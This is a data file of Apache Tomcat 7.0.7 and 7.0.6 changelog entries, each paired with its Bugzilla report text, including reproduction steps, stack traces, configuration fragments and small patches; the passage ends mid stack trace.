Catalina|Tomcat 7.0.7 (markt)|fix|50683|Ensure annotations are scanned when unpackWARs is set to false in the Host where a web application is deployed. (markt)|"Servlet 3.0 annotations not scanned if unpackWars=""false"""|"Created attachment 26572 [details]
minimal test case war with source

Overview: 

Given a very simple HelloServlet using @WebServlet annotation, and packed in a war file without a web.xml, the container does not scan for annotations if unpackWars=""false"" in the <Host> element of server.xml and the servlet is never added to the context.

Steps to Reproduce: 

    1) Set unpackWars=""fase""

    2) copy attached war file to webapps

    3) launch Tomcat

    4) navigate to:  http://<servername>/Hello/SayHello

Actual Results: 

  HTTP Status 404 - /Hello/SayHello

  type Status report

  message /Hello/SayHello

  description The requested resource (/Hello/SayHello) is not available.
  Apache Tomcat/7.0.6

Expected Results: 

  Hello"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50683
Catalina|Tomcat 7.0.7 (markt)|fix||Improve HTTP specification compliance in support of Accept-Language header. This protects from known exploit of the Oracle JVM bug that triggers a DoS, CVE-2010-4476. (kkolinko)|||
Coyote|Tomcat 7.0.7 (markt)|fix||Prevent possible thread exhaustion if a Comet timeout event takes a while to complete. (markt)|||
Coyote|Tomcat 7.0.7 (markt)|fix||Prevent multiple Comet END events if the CometServlet calls event.close() during an END event. (markt)|||
Coyote|Tomcat 7.0.7 (markt)|fix|50325|When the JVM indicates support for RFC 5746, disable Tomcat's allowUnsafeLegacyRenegotiation configuration attribute and use the JVM configuration to control renegotiation. (markt)|Update Tomcat to use JRE provided solutions for CVE-2009-3555 if available|"See http://www.oracle.com/technetwork/java/javase/documentation/tlsreadme2-176330.html for information on the Oracle provided features.

Need to review this to see what - if anything - we can do in Tomcat."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50325
Coyote|Tomcat 7.0.7 (markt)|fix|50405|Fix occasional NPE when using NIO connector and Comet. (markt)|Null Pointer Exception at Coyote Adapter|"I am using Tomcat 7.0.5 on Windows 7 and Fedora (this issue happens in both), using the Http11NioProtocol for a SSL connection with a self-signed certificate.
Session persistence is disabled, and Comet connection tracking is enabled, in context.xml.

I have a servlet that implements CometProcessor. It seems to runs fine. However, at the first time-out event, the following error gets logged:

SEVERE: An exception or error occurred in the container during the request processing
java.lang.NullPointerException
	at org.apache.catalina.connector.CoyoteAdapter.asyncDispatch(CoyoteAdapter.java:270)
	at org.apache.coyote.http11.Http11NioProcessor.asyncDispatch(Http11NioProcessor.java:233)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.event(Http11NioProtocol.java:305)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1526)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:662)

It doesn't seem to happen again after subsequent time-outs from the same session. If one logs in again under another session, the exception happens again after the first time out.
I haven't observed any adverse practical implications. However, I am running this on a machine with very few users and have not tested yet on a full scale."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50405
Coyote|Tomcat 7.0.7 (markt)|fix||Ensure correct recycling of NIO input filters when processing Comet events. (markt)|||
Coyote|Tomcat 7.0.7 (markt)|fix|50627|Correct interaction of NIO socket and Poller when processing Comet events. (markt)|Bug in Tomcat Comet. Event CometEvent.EventType.END is not fired when connection closed.‚Äè|"I noticed a problem that did not exist in Tomcat 6: event CometEvent.EventType.END is not fired when client connection is closed.
It is very easy to duplicate. The server and client code is below. You would need to open html page in a browser and press ""TEST"". This should print ""Begin Event"" in the server. If you close the browser (close connection), the ""End Event"" is not printed. It is printed with Tomcat 6.

It is similar to bug https://issues.apache.org/bugzilla/show_bug.cgi?id=50207, that marked as fixed. Not sure if it is related or not.

SERVER:
package test;

import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;

import org.apache.catalina.comet.CometEvent;
import org.apache.catalina.comet.CometProcessor;

public class TomcatBug extends HttpServlet implements CometProcessor {

    public void event(CometEvent event) throws IOException, ServletException {
        if (event.getEventType() == CometEvent.EventType.BEGIN) {
            System.out.println(""Begin Event"");
        }
        else if (event.getEventType() == CometEvent.EventType.ERROR) {
            System.out.println(""Error Event"");
            event.close();
        }
        else if (event.getEventType() == CometEvent.EventType.END) {
            System.out.println(""End Event"");
            event.close();
        }
    }
}

CLIENT (html):
<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/1999/REC-html401-19991224/loose.dtd"">
<html>
<head>
    <title>test</title>
</head>
<body>
    <input type=""button"" value=""TEST"" onclick=""test(); return false;"" />

    <script type=""text/javascript"">
        function test() {
            var api = new XMLHttpRequest;
            api.onreadystatechange = onreadystatechange;

            api.open(""GET"", ""http://localhost/Test/Controller"", true);

            api.send("""");
        }

        function onreadystatechange() {
        }

    </script>

</body>
</html>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50627
Coyote|Tomcat 7.0.7 (markt)|fix||Correct interaction of APR socket and Poller when processing Comet events. (markt)|||
Coyote|Tomcat 7.0.7 (markt)|fix|50631|InternalNioInputBuffer should honor maxHttpHeadSize. (kkolinko)|InternalNioInputBuffer should honor maxHttpHeadSize|InternalNioInputBuffer automatically expands its buffer while reading in request line, effectively ignoring the maxHttpHeaderSize setting.|https://bz.apache.org/bugzilla/show_bug.cgi?id=50631
Jasper|Tomcat 7.0.7 (markt)|fix||Improve special case handling of javax.servlet.jsp.el.ScopedAttributeELResolver in javax.el.CompositeELResolver to handle sub-classes. (markt)|||
Jasper|Tomcat 7.0.7 (markt)|update|15688|Use fully-qualified class names in generated jsp files to avoid naming conflicts with user imports. (markt)|full-qualified names instead of imports|"Hi,

Jasper generated *.java-files that are compiled.
The template for those files is very ""unaesthetic"".

I could demonstrate nice side-effects using a simple
  <%@ page import=""mypackage.Jspfactory"" %>

You should use full qualified names instead of a bunch of import-staments.
For example
  _jspxFactory = JspFactory.getDefaultFactory();
would become
  _jspxFactory = javax.servlet.jsp.JspFactory.getDefaultFactory();
and if you don't already do,
you should use the this-reference where possible.

I don't know what the spec says about that conflict, but it shouldn't be a bad
idea to use full-qualified names instead of imports."|https://bz.apache.org/bugzilla/show_bug.cgi?id=15688
Jasper|Tomcat 7.0.7 (markt)|fix|46819|Remove redundant object instantiations in JspRuntimeLibrary. Patch provided by Anthony Whitford. (markt)|Remove redundant object instantiations in JspRuntimeLibrary|"Created attachment 23353 [details]
Patch file to replace new with valueOf, and some valueOf with parse

While perusing the code, I noticed that java\org\apache\jasper\runtime\JspRuntimeLibrary.java code was doing a few things that I think can be improved:

1.  coerce methods were instantiating new objects, only to convert them to primitives.  For example:

    return Boolean.valueOf(s).booleanValue();

This can be rewritten (and simplified) as:

    return Boolean.parseBoolean(s);

This pattern was repeated for numerous primitive types.


2.  Objects were being instantiated using new instead of calling valueOf.  For example:

    return new Byte((byte) 0);

instead of:

    return Byte.valueOf((byte) 0);

According to the Java API, valueOf should generally be used in preference to the constructor as this method is likely to yield significantly better space and time performance.

3.  toString methods are instantiating a temporary object just to turn it into a string value.  For example:

    return new Integer(i).toString();

This can be rewritten (and simplified) as:

    return Integer.toString(i);

This pattern was repeated for numerous primitive types.


I took the liberty of creating a patch.  These changes should yield improved performance and reduce the memory footprint."|https://bz.apache.org/bugzilla/show_bug.cgi?id=46819
Jasper|Tomcat 7.0.7 (markt)|update||Improve error message when EL identifiers are not valid Java identifiers and use i18n for the error message. (markt)|||
Jasper|Tomcat 7.0.7 (markt)|fix|50680|Prevent an NPE when using tag files from an exploded JAR file, e.g. from within an IDE. Patch provided by Larry Isaacs. (markt)|"NPE in TagFileProcessor when tag file is in an expanded directory ""jar"""|"Created attachment 26570 [details]
Patch against current trunk to add a null check to TagFileProcessor

When using VirtualDirContext, or the equivalent in the Web Tools Tomcat support, an expanded directory can be used in place of a jar file.  In this case, tag files in the directory's META-INF folder will result in an NPE because the jarResource obtained from the TldLocation is null."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50680
Cluster|Tomcat 7.0.7 (markt)|fix|50591|Fix NPE in ReplicationValve. (kkolinko)|NPE in ReplicationValve in 7.0.6|"It was reported on the users@ list:
http://tomcat.markmail.org/thread/44rnbj7gbkevzb32

SEVERE: Unable to perform replication request.
java.lang.NullPointerException
      at org.apache.catalina.ha.tcp.ReplicationValve.isRequestWithoutSessionChange(ReplicationValve.java:554)

It will occur when ReplicationValve#filter attribute has an empty value."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50591
Cluster|Tomcat 7.0.7 (markt)|add||Internationalise the log messages for the FarmWarDeployer. (markt)|||
Cluster|Tomcat 7.0.7 (markt)|fix|50600|Prevent a ConcurrentModificationException when removing a WAR file via the FarmWarDeployer. (markt)|ConcurrentModificationException removing WAR via FarmWarDeployer|"The following exception was reported via $work

WARNING: Exception processing cluster org.apache.catalina.ha.tcp.SimpleTcpCluster@68e4e358 background process
java.util.ConcurrentModificationException
at java.util.HashMap$HashIterator.nextEntry(HashMap.java:810)
at java.util.HashMap$EntryIterator.next(HashMap.java:851)
at java.util.HashMap$EntryIterator.next(HashMap.java:849)
at org.apache.catalina.ha.deploy.WarWatcher.check(WarWatcher.java:87)
at org.apache.catalina.ha.deploy.FarmWarDeployer.backgroundProcess(FarmWarDeployer.java:609)
at org.apache.catalina.ha.tcp.SimpleTcpCluster.backgroundProcess(SimpleTcpCluster.java:596)
at org.apache.catalina.core.ContainerBase.backgroundProcess(ContainerBase.java:1302)
at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1601)
at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1610)
at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.run(ContainerBase.java:1590)
at java.lang.Thread.run(Thread.java:636)

The root cause is removing the entry directly from the Map rather than from the iterator. I have a patch that I'll apply shortly."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50600
Cluster|Tomcat 7.0.7 (markt)|fix||Be consistent with locks on sessionCreationTiming, sessionExpirationTiming in DeltaManager.resetStatistics(). (kkolinko)|||
Cluster|Tomcat 7.0.7 (markt)|fix|50648|Correctly set the interrupt status if a thread using RpcChannel is interrupted waiting for a message reply. Based on a patch by Olivier Costet. (markt)|RpcChannel improvements|"Created attachment 26545 [details]
svn diff

This enhancement proposal addresses three separate issues with the RpcChannel tribes component.

1. There is a minor bug in a catch(InterruptedException) clause, in which a call to Thread#interrupted() is made, as opposed to Thread#interrupt(), as it should be.

2. The RpcChannel API user registers an RpcCallback to be notified of communication events. However, there is no callback method for the case where the sending of a response message fails. This proposal includes the addition of a corresponding callback for such cases. To ensure backwards-compatibility, the additional callback method has been declared in a sub-interface of RpcCallback, named RpcCallback2 for the time being.

3. Since the tribes classes are loaded by the tomcat loader, if the messages sent through tribes are instances of classes defined in the webapp, attemps to deserialize them will fail. AbstractReplicatedMap includes a mechanism for the API user to specify class loaders to be used when deserializing map entries. This enhancement proposal includes a similar mechanism for the RpcChannel.

Please find the proposed modifications attached."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50648
Cluster|Tomcat 7.0.7 (markt)|fix|50646|Ensure larger Tribes messages are fully read. Patch provided by Olivier Costet. (markt)|Tribes ByteMessage will get corrupted if message size exceeds the underlying buffer size|"The Tribes ByteMessage class is used to transfer byte payloads in the context of the tribes communication framework.

Due to how the message is deserialized, there will be data loss (and hence corruption) if the message size exceeds the underlying buffer size.

The solution is to replace an ObjectInput#read(byte[]) call by ObjectInput#readFully(byte[]).

Fix is attached."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50646
Cluster|Tomcat 7.0.7 (markt)|fix|50679|Update the FarmWarDeployer to support parallel deployment. (markt)|FarmDeployer doesn't support parallel deployment|"Version: Tomcat 7.0.6
Component: Catalina
OS: Windows 7 64bit

Overview:

Parallel deployment works like a charm in a non-clustered environment. But when deploying a versioned app (APPNAME##VERSION.war) to a farm deployer directory, it seems that the filename encoding of the ## delimiter is not translated correctly to identify the war file on the file system:

## is translated to %23%23

Reproduce:

1. Create a version app file
2. Deploy file to watched farm deployer directory

Expected result:
- Versioned app is copyied to cluster members and deployed

Actual result:
- Versioned app is NOT copyied to cluster members.

catalina.log displays the following error messages:


[ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO  org.apache.catalina.ha.deploy.FarmWarDeployer- Installing webapp[/Shop##201101261] from C:\Apache\Tomcat7\cluster\webapps\Shop##201101261.war

[ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO  org.apache.catalina.ha.deploy.FarmWarDeployer- Cluster wide remove of web app /Shop##201101261

[ContainerBackgroundProcessor[StandardEngine[Catalina]]] ERROR org.apache.catalina.ha.deploy.FarmWarDeployer- Unable to install WAR file
java.io.FileNotFoundException: C:\Apache\Tomcat7\cluster\webapps\Shop%23%23201101261.war (Das System kann die angegebene Datei nicht finden)
        at java.io.FileInputStream.open(Native Method)
        at java.io.FileInputStream.<init>(FileInputStream.java:106)
        at org.apache.catalina.ha.deploy.FileMessageFactory.<init>(FileMessageFactory.java:152)
        at org.apache.catalina.ha.deploy.FileMessageFactory.getInstance(FileMessageFactory.java:175)
        at org.apache.catalina.ha.deploy.FarmWarDeployer.install(FarmWarDeployer.java:372)
        at org.apache.catalina.ha.deploy.FarmWarDeployer.fileModified(FarmWarDeployer.java:468)
        at org.apache.catalina.ha.deploy.WarWatcher.check(WarWatcher.java:95)
        at org.apache.catalina.ha.deploy.FarmWarDeployer.backgroundProcess(FarmWarDeployer.java:591)
        at org.apache.catalina.ha.tcp.SimpleTcpCluster.backgroundProcess(SimpleTcpCluster.java:627)
        at org.apache.catalina.core.ContainerBase.backgroundProcess(ContainerBase.java:1200)
        at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1393)
        at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1403)
        at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.run(ContainerBase.java:1382)
        at java.lang.Thread.run(Thread.java:662)

[ContainerBackgroundProcessor[StandardEngine[Catalina]]] INFO  org.apache.catalina.startup.HostConfig- Deploying web application archive Shop##201101261.war

Relevant configuration in server.xml:

...
      <Host name=""sbwebapp1"" appBase=""${catalina.base}/cluster/webapps""
            unpackWARs=""true"" autoDeploy=""true"">

	     <Cluster className=""org.apache.catalina.ha.tcp.SimpleTcpCluster""
	               channelSendOptions=""8"">
	
	        <Manager className=""org.apache.catalina.ha.session.DeltaManager""
	                 expireSessionsOnShutdown=""true""
	                 notifyListenersOnReplication=""false""
									 stateTransferTimeout=""5""/>
	
	        <Channel className=""org.apache.catalina.tribes.group.GroupChannel"">
	          <Membership className=""org.apache.catalina.tribes.membership.McastService""
	                      address=""228.0.0.4""
	                      port=""45564""
	                      frequency=""500""
	                      dropTime=""3000""/>
	          <Receiver className=""org.apache.catalina.tribes.transport.nio.NioReceiver""
	                    address=""192.168.222.220""
	                    port=""4000""
	                    autoBind=""100""
	                    selectorTimeout=""5000""
	                    maxThreads=""6""/>
	
	          <Sender className=""org.apache.catalina.tribes.transport.ReplicationTransmitter"">
	            <Transport className=""org.apache.catalina.tribes.transport.nio.PooledParallelSender""/>
	          </Sender>
	          <Interceptor className=""org.apache.catalina.tribes.group.interceptors.TcpFailureDetector""/>
	          <Interceptor className=""org.apache.catalina.tribes.group.interceptors.MessageDispatch15Interceptor""/>
	          <Interceptor className=""org.apache.catalina.tribes.group.interceptors.ThroughputInterceptor""/>
	        </Channel>
	
	        <Valve className=""org.apache.catalina.ha.tcp.ReplicationValve""
	                 filter="".*\.gif;.*\.js;.*\.jpg;.*\.png;.*\.htm;.*\.html;.*\.css;.*\.txt;.*\.swf;.*\.flv;""/>
	        <Valve className=""org.apache.catalina.ha.session.JvmRouteBinderValve""/>	        
	
	        <ClusterListener className=""org.apache.catalina.ha.session.JvmRouteSessionIDBinderListener""/>
	        <ClusterListener className=""org.apache.catalina.ha.session.ClusterSessionListener""/>
	        
	        <Deployer className=""org.apache.catalina.ha.deploy.FarmWarDeployer""
	                  tempDir=""${catalina.base}/cluster/temp/""
	                  deployDir=""${catalina.base}/cluster/webapps/""
	                  watchDir=""${catalina.base}/cluster/deploy/""
	                  watchEnabled=""true""/>        
	      </Cluster>

        <!-- Access log processes all example.
             Documentation at: /docs/config/valve.html
             Note: The pattern used is equivalent to using pattern=""common"" -->
        <Valve className=""org.apache.catalina.valves.AccessLogValve"" directory=""logs""  
               prefix=""ajp_access_"" suffix="".log""
               pattern=""%h %l %u %t &quot;%r&quot; %s %b"" resolveHosts=""false""/>             

      </Host>
..."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50679
Web applications|Tomcat 7.0.7 (markt)|fix|22278|Add a commented out RemoteAddrValve that limits access to the Manager and Host Manager applications to localhost. Based on a patch by Yann C√©bron. (markt)|[PATCH] Include RemoteAddrValve in manager.xml|"The TC-Administration webapp context-descriptor admin.xml includes a (out-
commented) RemoteAddrValve to restrict access to localhost ""for obvious 
security reasons"" - so should the manager webapp for the same reason."|https://bz.apache.org/bugzilla/show_bug.cgi?id=22278
Web applications|Tomcat 7.0.7 (markt)|fix||Correct a handful of Javadoc warnings. (markt)|||
Web applications|Tomcat 7.0.7 (markt)|add||Provide additional detail about how web application version order is determined when using parallel deployment. (markt)|||
Web applications|Tomcat 7.0.7 (markt)|fix||Correct the documentation for the recoveryCount count attribute of the the default cluster membership. (markt)|||
Web applications|Tomcat 7.0.7 (markt)|fix|50441|Clarify when it is valid to set the docBase attribute in a Context element. (markt)|It is not possible to have multiple instacnes of same docBase inside appBase|"When I set docBase in context tag to relative path it is not possible to have more then one Context with same docBase. For example

We have two XML files for our application in folder Catalina/localhost.
iis.xml and iisstampa.xml. Both of them have the same docBase=""iis"".
appBase is set to webbaps in Host tag in server.xml.

iis.xml is loaded corectly, but iisstampa.xml is not. This is because inside of method org.apache.catalina.startup.HostConfig.deployDescriptor there is part that recognizes that {tomcat_home}/webapps/iis folder is inside of appBase an docBase attribute is ignored by calling context.setDocBase(null). This causes Tomcat looks for folder iisstampa inside of appbase which of course does not exist.

If we put this context and docBase outside appBase everything works corectly.

But described situation is in conflict with documentation because it is not possible to have multiple instances of same docBase if the docBase is inside appBase.

This behavour is introduced in revision SVN 303926 of Tomcat 5.5 by remm (Remy Maucherat) as a solution of bug 34840 to recognize if the context path is external.

This bug exists on Tomcat 7 also.

We experinced this bug during migration from tomcat 5.5.4 to Tomcat 6 so this is reason reporting in Tomcat 6 section."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50441
Web applications|Tomcat 7.0.7 (markt)|fix|50526|Provide additional documentation on configuring JavaMail resources. (markt)|Clarify that JavaMail Session JNDI resource factory can accept any configuration attribute from JavaMail|"From the examples currently shown in jndi-resources-howto.html, one might assume that adding ""foo.bar.baz"" will be added to the java.util.Properties object passed-into the Session.getInstance method, but it is not entirely clear.

It would be nice to explicitly state that arbitrary <Resource> attributes will be converted into Session configuration properties.

Also, there are certain properties that are outside of the JavaMail spec, such as ""password""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50526
Web applications|Tomcat 7.0.7 (markt)|fix|50599|Use correct names of roles required to access the Manager application. (markt)|"Documentation gives impression that ""manager"" role enables using ant deploy"|"http://tomcat.apache.org/tomcat-7.0-doc/appdev/processes.html says that ""manager"" role is necessary to use ant deploy task, but seems that it should be actually ""manager-script""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50599
Other|Tomcat 7.0.7 (markt)|add||Extend the Checkstyle tests to check for license headers. (markt)|||
Other|Tomcat 7.0.7 (markt)|fix||Modify the build script so a release build always rebuilds the dependencies to ensure that the correct Tomcat version appears in the manifest. (markt)|||
Other|Tomcat 7.0.7 (markt)|fix||Code clean-up to remove unused code and reduce IDE warnings. (markt)|||
Other|Tomcat 7.0.7 (markt)|fix|50601|Code clean-up. Patch provided by sebb. (markt)|Redundant null checks before instanceof in equals()|"Created attachment 26497 [details]
Patch to remove null checks

There are several instances of the following code in equals methods:

if (obj == null) return false;
if (!(obj instanceof SomeClass)) return false;

The null check is redundant, as null will fail the instanceof check."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50601
Other|Tomcat 7.0.7 (markt)|fix|50606|Improve CGIServlet: Provide support for specifying empty value for the executable init-param. Provide support for explicit additional arguments for the executable. Those were broken when implementing fix for bug 49657. (kkolinko)|Error running CGI executable in Tomcat 6.0.30|"Created attachment 26502 [details]
localhost.2011-01-18.log

I have web application hosting CGI executable with the following settings for CGI
    <servlet>
        <servlet-name>cgi</servlet-name>
        <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
        <init-param>
          <param-name>debug</param-name>
          <param-value>2</param-value>
        </init-param>
        <init-param>
          <param-name>cgiPathPrefix</param-name>
          <param-value>WEB-INF/cgi</param-value>
        </init-param>
        <init-param>
          <param-name>executable</param-name>
          <param-value></param-value>
        </init-param>        
        <init-param>
          <param-name>passShellEnvironment</param-name>
          <param-value>true</param-value>
        </init-param>       
    </servlet>

This was Ok in Tomcat 6.0.29 but not in 6.0.30, see attachment."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50606
General|Tomcat 7.0.6 (markt)|update||Update to Apache Commons Daemon 1.0.5. (mturk)|||
Catalina|Tomcat 7.0.6 (markt)|fix|8705|org.apache.catalina.SessionListener now extends java.util.EventListener. (markt)|SessionListener should extend EventListener|"org.apache.catalina.SessionListener does not extend java.util.EventListener

To meet the Javabean event spec, it must. This should not break anything, since 
(a) it currently does not extend anything and (b) the EventListener interface 
does not contain any methods."|https://bz.apache.org/bugzilla/show_bug.cgi?id=8705
Catalina|Tomcat 7.0.6 (markt)|add|10526|Add an option to the Authenticators to force the creation of a session on authentication which may offer some performance benefits. (markt)|Authenticators do not always cache the Principal|"Once a user is authenticated a Principal object is supposed to be cached for 
the duration of the user's session. This is especially important when using 
JDBCRealm or JNDIRealm to reduce the load on external authentication services.

Most authenticators (BasicAuthenticator, SSLAuthenticator and 
DigestAuthenticator) call AuthenticatorBase.register()to cache the Principal. 
However register() does nothing if a session object does not already exist, so 
caching does not occur when the application does not create a session object 
itself. The problem can be seen by setting a security constraint on tomcat-docs 
and then browsing the Tomcat documentation - the external authentication 
service is hit on every request.

The problem does not occur with form based login, because FormAuthenticator 
caches the Principal itself and creates a new session if necessary to do it.

Probably the best fix would be to change AuthenticatorBase.register() to create 
a new session by calling getSession(request, true) instead of getSession
(request, false). However, perhaps there is a reason why this is not being 
done - though if so I cannot see what it is.

An alternative is to change the concrete authentication classes to make sure a 
session exists before calling register(), e.g.

--- BasicAuthenticator.java     23 Mar 2002 17:52:16 -0000      1.12
+++ BasicAuthenticator.java     6 Jul 2002 12:46:30 -0000
@@ -160,6 +160,7 @@
         String password = parsePassword(authorization);
         principal = context.getRealm().authenticate(username, password);
         if (principal != null) {
+           Session session = getSession(request, true);
             register(request, response, principal, Constants.BASIC_METHOD,
                      username, password);
             return (true);

Similar patches would be required for SSLAuthenticator and DigestAuthenticator 
of course."|https://bz.apache.org/bugzilla/show_bug.cgi?id=10526
Catalina|Tomcat 7.0.6 (markt)|update|10972|Improve error message if the className attribute is missing on an element in server.xml where it is required. (markt)|<Realm> without className in server.xml produces NullPointerException|"If the className attribute is not included with the <Realm> tag in server.xml, 
the server dies with a cryptic NullPointerException.  It would be nice if it 
produced a more meaningful error message (like ""Missing className attribute for 
<Realm> tag"")."|https://bz.apache.org/bugzilla/show_bug.cgi?id=10972
Catalina|Tomcat 7.0.6 (markt)|update|48692|Provide option to parse application/x-www-form-urlencoded PUT requests. (schultz)|Provide option to parse application/x-www-form-urlencoded PUT requests|Provide an option to treat application/x-www-form-urlencoded encoded parameters in a PUT request in a similar manner to application/x-www-form-urlencoded parameters in a POST request|https://bz.apache.org/bugzilla/show_bug.cgi?id=48692
Catalina|Tomcat 7.0.6 (markt)|update|48822|Include context name in case of error while stopping or starting a context during its reload. Patch provided by Marc Guillemot. (slaurent)|Include contest name in reload and stop log statements|"Created attachment 25063 [details]
The patch adding context name in log statements

Current log statement are like this
  ""Exception starting Context""
without any information on the concerned context.

Include patch adds context name to the log output for en, fr, es... but not for the ja properties ;-)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=48822
Catalina|Tomcat 7.0.6 (markt)|add|48837|Extend thread local memory leak detection to include classes loaded by subordinate class loaders to the web application's class loader such as the Jasper class loader. Based on a patch by Sylvain Laurent. (markt)|Memory leaks protection does not detect leaks triggered by JSP pages code|"Created attachment 25077 [details]
webapps/examples/foo.jsp

The memory leaks protection feature of TC6/TC7 is able to heal certain types of memory leaks caused by servlet code (where classes are loaded by WebappClassLoader), but does not provide a cure for ones caused by JSP code (where classes are loaded by JasperLoader).

I think that is of little concern, as the code that triggers a memory leak is unlikely to be present on a JSP page or a tag file, but at least it provides us with an example to test the ""Find leaks"" diagnostics in the Manager webapp.


To reproduce:
1. Place the attached foo.jsp into the examples webapp
2. Open http://localhost:8080/examples/foo.jsp
3. Open the Manager web application
4. Reload or stop/start the examples application
5. Press the ""Find leaks"" button in the Manager
6. The message will be displayed that ""/examples"" app triggered a memory leak.

The leak is caused by foo.jsp creating a ThreadLocal holding an instance of some inner class of that JSP. (That inner class was loaded through JasperLoader, and thus was not detected when enumerating ThreadLocals in leaks protection code.)

7. Another ThreadLocal (holding a reference to some servlet) is successfully cleared by memory leak protection code when the examples application is stopped. You can see a message about that in the Tomcat logs."|https://bz.apache.org/bugzilla/show_bug.cgi?id=48837
Catalina|Tomcat 7.0.6 (markt)|add|48973|Avoid creating a SESSIONS.ser file when stopping an application if there's no session. Patch provided by Marc Guillemot. (slaurent)|Don't create SESSIONS.ser when no session exists|"Created attachment 25171 [details]
Patch skiping SESSIONS.ser file creation if no session exists

When a webapp is unloaded, a SESSIONS.ser file is created even if no session exists for the application. This is useless."|https://bz.apache.org/bugzilla/show_bug.cgi?id=48973
Catalina|Tomcat 7.0.6 (markt)|fix|49000|No longer accept specification invalid name only cookies by default. This behaviour can be restored using a system property. (markt)|Cookie parsing bug when an empty value has an equal sign on the end|"Created attachment 25190 [details]
Code patch that stops the loop parsing the final character if it's an equal sign

Cookie values such as the following don't get their last value parsed as an empty value.


i.e. this does create a 'bob' cookie key:

Cookie: fred=1; jim=2; bob

and this doesn't create a 'bob' cookie key:

Cookie: fred=1; jim=2; bob="|https://bz.apache.org/bugzilla/show_bug.cgi?id=49000
Catalina|Tomcat 7.0.6 (markt)|add|49159|Improve memory leak protection by renewing threads of the pool when a web application is stopped. (slaurent)|Improve ThreadLocal memory leak clean-up|Doing this in a thread-safe way means performing the clean-up in the thread where the ThreadLocal exists. A likely point is just before the Thread gets returned to the pool.|https://bz.apache.org/bugzilla/show_bug.cgi?id=49159
Catalina|Tomcat 7.0.6 (markt)|fix|49372|Re-fix after connector re-factoring. If connector initialisation fails (e.g. if a port is already in use) do not trigger an LifecycleException for an invalid state transition. (markt)|"7.0.0RC: Starting second instance of Tomcat on the same port results in ""An invalid Lifecycle transition was attempted"""|"Using the current pre-7.0.0 trunk as of now (r950811),
to reproduce:
1) start an instance of Tomcat
2) start the second instance of Tomcat using the same configuration

The start fails (as expected), but the messages are accompanied with 
LifecycleException:  An invalid Lifecycle transition was attempted ([before_stop]) for component [StandardServer[8005]] in state [STARTING]

See the log below.

03.06.2010 3:14:08 org.apache.catalina.startup.Catalina load
INFO: Initialization processed in 3145 ms
03.06.2010 3:14:09 org.apache.catalina.core.StandardService startInternal
INFO: Starting service Catalina
03.06.2010 3:14:09 org.apache.catalina.core.StandardEngine startInternal
INFO: Starting Servlet Engine: Apache Tomcat/7.0.0-dev
03.06.2010 3:14:09 org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deploying web application directory docs
03.06.2010 3:14:11 org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deploying web application directory examples
03.06.2010 3:14:12 org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deploying web application directory host-manager
03.06.2010 3:14:13 org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deploying web application directory manager
03.06.2010 3:14:13 org.apache.catalina.startup.HostConfig deployDirectory
INFO: Deploying web application directory ROOT
03.06.2010 3:14:13 org.apache.coyote.http11.Http11Protocol init
SEVERE: Error initializing endpoint
java.net.BindException: Address already in use: JVM_Bind <null>:8080
	at org.apache.tomcat.util.net.JIoEndpoint.init(JIoEndpoint.java:368)
	at org.apache.coyote.http11.Http11Protocol.init(Http11Protocol.java:125)
	at org.apache.catalina.connector.Connector.startInternal(Connector.java:866)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:137)
	at org.apache.catalina.core.StandardService.startInternal(StandardService.java:437)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:137)
	at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:648)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:137)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:576)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:288)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:415)
Caused by: java.net.BindException: Address already in use: JVM_Bind
	at java.net.PlainSocketImpl.socketBind(Native Method)
	at java.net.PlainSocketImpl.bind(PlainSocketImpl.java:365)
	at java.net.ServerSocket.bind(ServerSocket.java:319)
	at java.net.ServerSocket.<init>(ServerSocket.java:185)
